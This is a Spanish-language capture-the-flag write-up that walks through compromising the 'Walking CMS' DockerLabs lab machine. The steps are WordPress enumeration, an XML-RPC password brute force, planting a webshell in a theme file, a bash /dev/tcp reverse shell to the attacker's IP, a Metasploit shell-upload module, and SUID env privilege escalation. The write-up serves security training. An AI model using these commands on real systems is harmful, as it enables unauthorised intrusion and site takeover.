
# Walking CMS

<figure><img src="/files/4DDaFKdPS9gj2rMze6T9" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Despliegue de la máquina</mark>

```bash
sudo bash auto_deploy.sh walkingcms.tar

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2
```

Tenemos la IP: `172.17.0.2`

## <mark style="color:purple;">Primer acceso</mark>

Accedemos través del navegador y llegamos a una default page de Apache:

<figure><img src="/files/EnvKfU8pSyi1cvP1Nkki" alt=""><figcaption></figcaption></figure>

No obtenemos nada relevante, por lo que vamos a escanear los puertos abiertos en esta máquina.

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -A -sCV -T5 172.17.0.2
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
```

Solo encontramos el puerto 80 expuesto. En principio nada relevante.

## <mark style="color:purple;">Fuzzing</mark>

Haciendo fuzzing con feroxbuster vemos que nos encontramos ante un sitio web Wordpress

```bash
feroxbuster -t 200 -x php,txt,html -u http://172.17.0.2 
                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      368l      933w    10701c http://172.17.0.2/index.html
301      GET        9l       28w      312c http://172.17.0.2/wordpress => http://172.17.0.2/wordpress/
200      GET       24l      127w    10359c http://172.17.0.2/icons/openlogo-75.png
200      GET      368l      933w    10701c http://172.17.0.2/
301      GET        0l        0w        0c http://172.17.0.2/wordpress/index.php => http://172.17.0.2/wordpress/
200      GET        5l       13w      136c http://172.17.0.2/wordpress/wp-trackback.php
301      GET        9l       28w      321c http://172.17.0.2/wordpress/wp-admin => http://172.17.0.2/wordpress/wp-admin/
301      GET        9l       28w      324c http://172.17.0.2/wordpress/wp-includes => http://172.17.0.2/wordpress/wp-includes/
```

Vamos a acceder a `/wordpress` a ver que encontramos.

<figure><img src="/files/BUPxcyF3qjzAOy6qrtJG" alt=""><figcaption></figcaption></figure>

A priori nos encontramos una web básica en Wordpress, posiblemente en construcción.

## <mark style="color:purple;">Enumeración con WPScan</mark>

Vamos a lanzar un wpscan para enumerar  el sitio Wordpress:

```shell-session
wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vp
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://172.17.0.2/wordpress/ [172.17.0.2]
[+] Started: Mon Mar  3 17:54:12 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.17.0.2/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.17.0.2/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.17.0.2/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 6.7.2 identified (Latest, released on 2025-02-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://172.17.0.2/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.7.2</generator>
 |  - http://172.17.0.2/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.2</generator>

[+] WordPress theme in use: twentytwentytwo
 | Location: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 1.9
 | Style URL: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/style.css?ver=1.6
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 
 [+] mario
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

Bingo! Obtenemos el usuario `mario` y vemos que está activo `XML-RPC` con lo que podríamos hacer un bruteforce sin problema.

## <mark style="color:purple;">Bruteforce de XML-RCP</mark>

Vamos a usar el módulo de Metasploit `wordpress_xmlrpc_login` para hacer bruteforce de XML-RCP:

```bash
msf6 auxiliary(scanner/http/wordpress_xmlrpc_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/http/wordpress_xmlrpc_login) > set USERNAME mario
msf6 auxiliary(scanner/http/wordpress_xmlrpc_login) > set RHOST http://172.17.0.2
msf6 auxiliary(scanner/http/wordpress_xmlrpc_login) > set TARGETURI wordpress/xmlrpc.php
msf6 auxiliary(scanner/http/wordpress_xmlrpc_login) > exploit

[*] 172.17.0.2:80        :/wordpress/xmlrpc.php/xmlrpc.php - Sending Hello...
[+] 172.17.0.2:80 - XMLRPC enabled, Hello message received!
[*] Starting XML-RPC login sweep...
[-] 172.17.0.2:80 - Failed: 'mario:123456'
[!] No active DB -- Credential data will not be saved!
[-] 172.17.0.2:80 - Failed: 'mario:12345'
[-] 172.17.0.2:80 - Failed: 'mario:123456789'
[-] 172.17.0.2:80 - Failed: 'mario:password'
[-] 172.17.0.2:80 - Failed: 'mario:iloveyou'
[-] 172.17.0.2:80 - Failed: 'mario:princess'
[-] 172.17.0.2:80 - Failed: 'mario:travis'
[-] 172.17.0.2:80 - Failed: 'mario:myspace1'
[-] 172.17.0.2:80 - Failed: 'mario:babyblue'
[-] 172.17.0.2:80 - Failed: 'mario:sabrina'
[-] 172.17.0.2:80 - Failed: 'mario:michael1'
[-] 172.17.0.2:80 - Failed: 'mario:jeffrey'
[-] 172.17.0.2:80 - Failed: 'mario:stephen'
[+] 172.17.0.2:80 - Success: 'mario:love'
```

Bingo, obtenemos el password  para el usuario mario: `love`

También podríamos usar otras herramientas como CMSeek con la opción de Bruteforce CMSs, con un proceso un poco más automático:

```
python3 cmseek.py

 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  Tip: You can use cmseek via arguments as well check the help menu for more information  [+] 

 Input    Description
=======  ==============================
  [1]    CMS detection and Deep scan
  [2]    Scan Multiple Sites
  [3]    Bruteforce CMSs
  [U]    Update CMSeeK
  [R]    Rebuild Cache (Use only when you add any custom module)
  [0]    Exit CMSeeK :( 

Enter Your Desired Option: 3
```

```
 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  WordPress XML-RPC Bruteforce Module  [+] 

Enter target site (https://example.tld): http://172.17.0.2/wordpress
[i] Checking for WordPress
[*] WordPress Confirmed... validating xmlrpc interface
[*] Login form found.. Detecting Username For Bruteforce
[i] Starting Username Harvest
[i] Harvesting usernames from wp-json api
[!] Json api method failed trying with next
[i] Harvesting usernames from jetpack public api
[!] No results from jetpack api... maybe the site doesn't use jetpack
[i] Harvesting usernames from wordpress author Parameter
[*] Found user from redirection: mario
[*] 1 Usernames was enumerated


[i] Bruteforcing User: mario
[*] Password found: love
 |
 |--[username]--> mario
 |
 |--[password]--> love
 |
[*] Enjoy The Hunt!
```

## <mark style="color:purple;">Acceso web</mark>

Accedemos por `http://172.17.0.2/wordpress/wp-admin` con esas credenciales y accedemos correctamente:

<figure><img src="/files/RDIp3odjDExbEbhgwXxq" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Subida de Webshell</mark>

Vemos que tenemos activo el tema Twenty Twenty-Two, por lo que vamos a editar el `index.php` para introducir una webshell. Vamos a theme editor y buscamos el index , en ese index le colocamos el codigo de una webshell como P0wny Shell. Una vez modificado, guardamos el index y podemos ir a cargarlo en la web.

{% embed url="<https://github.com/flozz/p0wny-shell/blob/master/shell.php>" %}

<figure><img src="/files/owspp5c7kzXZcZGMBvup" alt=""><figcaption></figcaption></figure>

Aquí pegamos el código de P0wny Shell y abajo le damos a Update File:

<figure><img src="/files/6rJ0egseI7wqvp9DXxz0" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Acceso a la Webshell</mark>

Una vez subida, podemos acceder a la webshell en la siguiente URL:

```http
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php
```

<figure><img src="/files/VBGvjb0YvrWr81suAVuM" alt=""><figcaption></figcaption></figure>

Como estamos en una máquina de Dockerlabs a traves de Docker mi IP es la `172.17.0.1`:

```
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
```

Para devolvernos una revshell solamente necesitamos ejecutar el siguiente comando:

```bash
bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/4444 <&1'
```

<figure><img src="/files/v3zG6nKjycu0IxZE8Wb4" alt=""><figcaption></figcaption></figure>

Tenemos una shell, con lo que ya hemos comprometido parcialmente el host con un usuario sin privilegios.&#x20;

## Explotación alternativa

{% hint style="success" %}
También podríamos utilizar el módulo [wp\_admin\_shell\_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) de Metasploit que automatiza este proceso para cargar un shell y ejecutarlo automáticamente en la máquina sin tener que subir una webshell y devolvernos la revshell.
{% endhint %}

```bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 172.17.0.2
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /wordpress
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username mario
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password love
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.1.181:4444 
[*] Authenticating with WordPress using mario:love...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wordpress/wp-content/plugins/vUimgCXzFL/cUIluOCOIZ.php...
[*] Sending stage (40004 bytes) to 172.17.0.2
[+] Deleted cUIluOCOIZ.php
[+] Deleted vUimgCXzFL.php
[+] Deleted ../vUimgCXzFL
[*] Meterpreter session 1 opened (192.168.1.181:4444 -> 172.17.0.2:51904) at 2025-03-03 19:09:44 +0000

meterpreter > getuid
Server username: www-data
```

## <mark style="color:purple;">Escalada de privilegios</mark>

No podemos acceder a `/root` ni ver los permisos de ejecución con `sudo -l`:

```shell-session
www-data@c734fca6ef9e:/$ cd root
cd root
bash: cd: root: Permission denied

www-data@c734fca6ef9e:/$ sudo -l
sudo -l
bash: sudo: command not found
```

Vamos a buscar con find ejecutables que podammos aprovechar para escalar privilegios:

```shell-session
www-data@c734fca6ef9e:/$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/env
/usr/bin/chfn
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/passwd
```

Observamos el ejecutable env, que podemos explotar siguiendo los pasos de GTFOBIns:

{% embed url="<https://gtfobins.github.io/gtfobins/env/>" %}

Concretamente en la sección SUID encontramos una forma para elevar nuestros privilegios:

```bash
./env /bin/sh -p
```

Lo ejecutamos y ya somos root!

```shell-session
www-data@c734fca6ef9e:/$ env /bin/sh -p   
env /bin/sh -p
whoami
root
```
